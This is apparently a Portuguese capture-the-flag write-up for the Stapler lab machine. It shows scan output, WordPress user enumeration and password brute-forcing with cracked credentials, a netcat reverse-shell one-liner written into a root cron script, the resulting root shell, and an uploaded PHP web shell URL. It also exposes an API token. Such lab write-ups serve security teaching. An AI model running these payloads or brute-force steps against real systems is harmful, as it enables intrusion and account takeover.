Saída nmap:
```
# Nmap 7.80 scan initiated Sun Aug 16 14:25:47 2020 as: nmap -Pn -p- -sV -T5 -A -oN nmap_stapler stapler
Nmap scan report for stapler (192.168.56.107)
Host is up (0.00057s latency).
Not shown: 65523 filtered ports
PORT      STATE  SERVICE     VERSION
20/tcp    closed ftp-data
21/tcp    open   ftp         vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: PASV failed: 550 Permission denied.
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 192.168.56.105
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp    open   ssh         OpenSSH 7.2p2 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 81:21:ce:a1:1a:05:b1:69:4f:4d:ed:80:28:e8:99:05 (RSA)
|   256 5b:a5:bb:67:91:1a:51:c2:d3:21:da:c0:ca:f0:db:9e (ECDSA)
|_  256 6d:01:b7:73:ac:b0:93:6f:fa:b9:89:e6:ae:3c:ab:d3 (ED25519)
53/tcp    open   domain      dnsmasq 2.75
| dns-nsid:
|_  bind.version: dnsmasq-2.75
80/tcp    open   http        PHP cli server 5.5 or later
|_http-title: 404 Not Found
123/tcp   closed ntp
137/tcp   closed netbios-ns
138/tcp   closed netbios-dgm
139/tcp   open   netbios-ssn Samba smbd 4.3.9-Ubuntu (workgroup: WORKGROUP)
666/tcp   open   doom?
| fingerprint-strings:
|   NULL:
|     message2.jpgUT
|     QWux
|     "DL[E
|     #;3[
|     \xf6
|     u([r
|     qYQq
|     Y_?n2
|     3&M~{
|     9-a)T
|     L}AJ
|_    .npy.9
3306/tcp  open   mysql       MySQL 5.7.12-0ubuntu1
| mysql-info:
|   Protocol: 10
|   Version: 5.7.12-0ubuntu1
|   Thread ID: 7
|   Capabilities flags: 63487
|   Some Capabilities: SupportsLoadDataLocal, LongPassword, Support41Auth, Speaks41ProtocolOld, IgnoreSpaceBeforeParenthesis, DontAllowDatabaseTableColumn, ConnectWithDatabase, SupportsCompression, InteractiveClient, Speaks41ProtocolNew, SupportsTransactions, LongColumnFlag, IgnoreSigpipes, FoundRows, ODBCClient, SupportsAuthPlugins, SupportsMultipleResults, SupportsMultipleStatments
|   Status: Autocommit
|   Salt: \x1Ept\x11
| \x14]C'~\x08,}g*+\x151@O
|_  Auth Plugin Name: mysql_native_password
12380/tcp open   http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port666-TCP:V=7.80%I=7%D=8/16%Time=5F396CFD%P=x86_64-pc-linux-gnu%r(NUL
SF:L,2D58,"PK\x03\x04\x14\0\x02\0\x08\0d\x80\xc3Hp\xdf\x15\x81\xaa,\0\0\x1
SF:52\0\0\x0c\0\x1c\0message2\.jpgUT\t\0\x03\+\x9cQWJ\x9cQWux\x0b\0\x01\x0
SF:4\xf5\x01\0\0\x04\x14\0\0\0\xadz\x0bT\x13\xe7\xbe\xefP\x94\x88\x88A@\xa
SF:2\x20\x19\xabUT\xc4T\x11\xa9\x102>\x8a\xd4RDK\x15\x85Jj\xa9\"DL\[E\xa2\
SF:x0c\x19\x140<\xc4\xb4\xb5\xca\xaen\x89\x8a\x8aV\x11\x91W\xc5H\x20\x0f\x
SF:b2\xf7\xb6\x88\n\x82@%\x99d\xb7\xc8#;3\[\r_\xcddr\x87\xbd\xcf9\xf7\xaeu
SF:\xeeY\xeb\xdc\xb3oX\xacY\xf92\xf3e\xfe\xdf\xff\xff\xff=2\x9f\xf3\x99\xd
SF:3\x08y}\xb8a\xe3\x06\xc8\xc5\x05\x82>`\xfe\x20\xa7\x05:\xb4y\xaf\xf8\xa
SF:0\xf8\xc0\^\xf1\x97sC\x97\xbd\x0b\xbd\xb7nc\xdc\xa4I\xd0\xc4\+j\xce\[\x
SF:87\xa0\xe5\x1b\xf7\xcc=,\xce\x9a\xbb\xeb\xeb\xdds\xbf\xde\xbd\xeb\x8b\x
SF:f4\xfdis\x0f\xeeM\?\xb0\xf4\x1f\xa3\xcceY\xfb\xbe\x98\x9b\xb6\xfb\xe0\x
SF:dc\]sS\xc5bQ\xfa\xee\xb7\xe7\xbc\x05AoA\x93\xfe9\xd3\x82\x7f\xcc\xe4\xd
SF:5\x1dx\xa2O\x0e\xdd\x994\x9c\xe7\xfe\x871\xb0N\xea\x1c\x80\xd63w\xf1\xa
SF:f\xbd&&q\xf9\x97'i\x85fL\x81\xe2\\\xf6\xb9\xba\xcc\x80\xde\x9a\xe1\xe2:
SF:\xc3\xc5\xa9\x85`\x08r\x99\xfc\xcf\x13\xa0\x7f{\xb9\xbc\xe5:i\xb2\x1bk\
SF:x8a\xfbT\x0f\xe6\x84\x06/\xe8-\x17W\xd7\xb7&\xb9N\x9e<\xb1\\\.\xb9\xcc\
SF:xe7\xd0\xa4\x19\x93\xbd\xdf\^\xbe\xd6\xcdg\xcb\.\xd6\xbc\xaf\|W\x1c\xfd
SF:\xf6\xe2\x94\xf9\xebj\xdbf~\xfc\x98x'\xf4\xf3\xaf\x8f\xb9O\xf5\xe3\xcc\
SF:x9a\xed\xbf`a\xd0\xa2\xc5KV\x86\xad\n\x7fou\xc4\xfa\xf7\xa37\xc4\|\xb0\
SF:xf1\xc3\x84O\xb6nK\xdc\xbe#\)\xf5\x8b\xdd{\xd2\xf6\xa6g\x1c8\x98u\(\[r\
SF:xf8H~A\xe1qYQq\xc9w\xa7\xbe\?}\xa6\xfc\x0f\?\x9c\xbdTy\xf9\xca\xd5\xaak
SF:\xd7\x7f\xbcSW\xdf\xd0\xd8\xf4\xd3\xddf\xb5F\xabk\xd7\xff\xe9\xcf\x7fy\
SF:xd2\xd5\xfd\xb4\xa7\xf7Y_\?n2\xff\xf5\xd7\xdf\x86\^\x0c\x8f\x90\x7f\x7f
SF:\xf9\xea\xb5m\x1c\xfc\xfef\"\.\x17\xc8\xf5\?B\xff\xbf\xc6\xc5,\x82\xcb\
SF:[\x93&\xb9NbM\xc4\xe5\xf2V\xf6\xc4\t3&M~{\xb9\x9b\xf7\xda-\xac\]_\xf9\x
SF:cc\[qt\x8a\xef\xbao/\xd6\xb6\xb9\xcf\x0f\xfd\x98\x98\xf9\xf9\xd7\x8f\xa
SF:7\xfa\xbd\xb3\x12_@N\x84\xf6\x8f\xc8\xfe{\x81\x1d\xfb\x1fE\xf6\x1f\x81\
SF:xfd\xef\xb8\xfa\xa1i\xae\.L\xf2\\g@\x08D\xbb\xbfp\xb5\xd4\xf4Ym\x0bI\x9
SF:6\x1e\xcb\x879-a\)T\x02\xc8\$\x14k\x08\xae\xfcZ\x90\xe6E\xcb<C\xcap\x8f
SF:\xd0\x8f\x9fu\x01\x8dvT\xf0'\x9b\xe4ST%\x9f5\x95\xab\rSWb\xecN\xfb&\xf4
SF:\xed\xe3v\x13O\xb73A#\xf0,\xd5\xc2\^\xe8\xfc\xc0\xa7\xaf\xab4\xcfC\xcd\
SF:x88\x8e}\xac\x15\xf6~\xc4R\x8e`wT\x96\xa8KT\x1cam\xdb\x99f\xfb\n\xbc\xb
SF:cL}AJ\xe5H\x912\x88\(O\0k\xc9\xa9\x1a\x93\xb8\x84\x8fdN\xbf\x17\xf5\xf0
SF:\.npy\.9\x04\xcf\x14\x1d\x89Rr9\xe4\xd2\xae\x91#\xfbOg\xed\xf6\x15\x04\
SF:xf6~\xf1\]V\xdcBGu\xeb\xaa=\x8e\xef\xa4HU\x1e\x8f\x9f\x9bI\xf4\xb6GTQ\x
SF:f3\xe9\xe5\x8e\x0b\x14L\xb2\xda\x92\x12\xf3\x95\xa2\x1c\xb3\x13\*P\x11\
SF:?\xfb\xf3\xda\xcaDfv\x89`\xa9\xe4k\xc4S\x0e\xd6P0");
MAC Address: 08:00:27:5A:C8:EF (Oracle VirtualBox virtual NIC)
Aggressive OS guesses: Linux 3.2 - 4.9 (97%), Linux 3.13 (94%), OpenWrt Chaos Calmer 15.05 (Linux 3.18) or Designated Driver (Linux 4.1 or 4.4) (94%), Linux 4.10 (94%), Linux 3.2 - 3.10 (94%), Linux 3.2 - 3.16 (94%), Linux 3.10 - 4.11 (93%), Linux 3.16 - 4.6 (93%), Sony Bravia smart TV (Android) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 1 hop
Service Info: Host: RED; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: -3h20m01s, deviation: 34m33s, median: -3h00m04s
|_nbstat: NetBIOS name: RED, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery:
|   OS: Windows 6.1 (Samba 4.3.9-Ubuntu)
|   Computer name: red
|   NetBIOS computer name: RED\x00
|   Domain name: \x00
|   FQDN: red
|_  System time: 2020-08-16T15:29:54+01:00
| smb-security-mode:
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode:
|   2.02:
|_    Message signing enabled but not required
| smb2-time:
|   date: 2020-08-16T14:29:52
|_  start_date: N/A

TRACEROUTE
HOP RTT     ADDRESS
1   0.57 ms stapler (192.168.56.107)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sun Aug 16 14:30:22 2020 -- 1 IP address (1 host up) scanned in 280.05 seconds
```

Vou resumir, existe muita coisa para enumerar, acesso anônimo ao ftp e smb, o serviço que está rodando na porta 666 (identificar do que o arquivo se trata, extraí-lo e garantir um cookie rsrs) e etc. São muitos usuários, criei um arquivos 'users' e fui colocando cada um lá.

Saída nikto:

```
SSL Info:        Subject:  /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost                                                                                  
Ciphers:  ECDHE-RSA-AES256-GCM SHA384                                                                                        
Issuer:   /C=UK/ST=Somewhere in the middle of nowhere/L=Really, what are you meant to put here?/O=Initech/OU=Pam: I give up. no idea what to put here./CN=Red.Initech/emailAddress=pam@red.localhost
+ Entry '/admin112233/' in robots.txt returned a non-forbidden or redirect HTTP code (200)                                                                    
+ Entry '/blogblog/' in robots.txt returned a non-forbidden or redirect HTTP code (200)
```
Usuários no /home:

```
drwxr-xr-x 2 AParnell   AParnell   4096 Jun  5  2016 AParnell
drwxr-xr-x 2 CCeaser    CCeaser    4096 Jun  5  2016 CCeaser
drwxr-xr-x 2 CJoo       CJoo       4096 Jun  5  2016 CJoo
drwxr-xr-x 2 DSwanger   DSwanger   4096 Jun  5  2016 DSwanger
drwxr-xr-x 2 Drew       Drew       4096 Jun  5  2016 Drew
drwxr-xr-x 2 ETollefson ETollefson 4096 Jun  5  2016 ETollefson
drwxr-xr-x 2 Eeth       Eeth       4096 Jun  5  2016 Eeth
drwxr-xr-x 2 IChadwick  IChadwick  4096 Jun  5  2016 IChadwick
drwxr-xr-x 2 JBare      JBare      4096 Jun  5  2016 JBare
drwxr-xr-x 2 JKanode    JKanode    4096 Jun  5  2016 JKanode
drwxr-xr-x 2 JLipps     JLipps     4096 Jun  5  2016 JLipps
drwxr-xr-x 2 LSolum     LSolum     4096 Jun  5  2016 LSolum
drwxr-xr-x 2 LSolum2    LSolum2    4096 Jun  5  2016 LSolum2
drwxr-xr-x 2 MBassin    MBassin    4096 Jun  5  2016 MBassin
drwxr-xr-x 2 MFrei      MFrei      4096 Jun  5  2016 MFrei
drwxr-xr-x 2 NATHAN     NATHAN     4096 Jun  5  2016 NATHAN
drwxr-xr-x 2 RNunemaker RNunemaker 4096 Jun  5  2016 RNunemaker
drwxr-xr-x 2 SHAY       SHAY       4096 Jun  5  2016 SHAY
drwxr-xr-x 2 SHayslett  SHayslett  4096 Jun  5  2016 SHayslett
drwxr-xr-x 2 SStroud    SStroud    4096 Jun  5  2016 SStroud
drwxr-xr-x 2 Sam        Sam        4096 Jun  5  2016 Sam
drwxr-xr-x 2 Taylor     Taylor     4096 Jun  5  2016 Taylor
drwxr-xr-x 2 elly       elly       4096 Jun  5  2016 elly
drwxr-xr-x 2 jamie      jamie      4096 Jun  5  2016 jamie
drwxr-xr-x 2 jess       jess       4096 Jun  5  2016 jess
drwxr-xr-x 2 kai        kai        4096 Jun  5  2016 kai
drwxr-xr-x 2 mel        mel        4096 Jun  5  2016 mel
drwxr-xr-x 3 peter      peter      4096 Jun  3  2016 peter
drwxrwxrwx 2 www        www        4096 Jun  5  2016 www
drwxr-xr-x 2 zoe        zoe        4096 Jun  5  2016 zoe
```
```
wpscan --url https://192.168.56.107:12380/blogblog/ -e --api-token 9aFIpZnrjTuGeWIqSg4cFLM1qAEFlPoVrsbSGR0OTak --disable-tls-checks
```

```
wpscan --url https://192.168.56.107:12380/blogblog/ -e -U wordpress_users -P /usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-500.txt --disable-tls-checks
```

```
| Username: garry, Password: football
 | Username: garry, Password: football
 | Username: scott, Password: cookie
 | Username: tim, Password: thumb
 | Username: harry, Password: monkey
| Username: john, Password: incorrect
```

O lse.sh retornou a seguinte linha:
```
/etc/cron.d/logrotate: */5 *   * * *   root  /usr/local/sbin/cron-logrotate.sh
```

Carga para ser colocada no cron-logrotate.sh:
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.56.105 1234 >/tmp/f
```

Como usuário root e flag final:
```
root@parrot:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [192.168.56.105] from (UNKNOWN) [192.168.56.107] 45066
/bin/sh: 0: can't access tty; job control turned off
# whoami
root
# cd /root
# ls   
fix-wordpress.sh
flag.txt
issue
python.sh
wordpress.sql
# cat flag.txt
~~~~~~~~~~<(Congratulations)>~~~~~~~~~~
                          .-'''''-.
                          |'-----'|
                          |-.....-|
                          |       |
                          |       |
         _,._             |       |
    __.o`   o`"-.         |       |
 .-O o `"-.o   O )_,._    |       |
( o   O  o )--.-"`O   o"-.`'-----'`
 '--------'  (   o  O    o)  
              `----------`
b6b545dc11b7a270f4bad23432190c75162c4a2b
```
Estava no menu Media -> Library.
Chamando o shell reverso:
```
https://192.168.56.107:12380/blogblog/wp-content/uploads/wordpress-plugin-shell.php
```
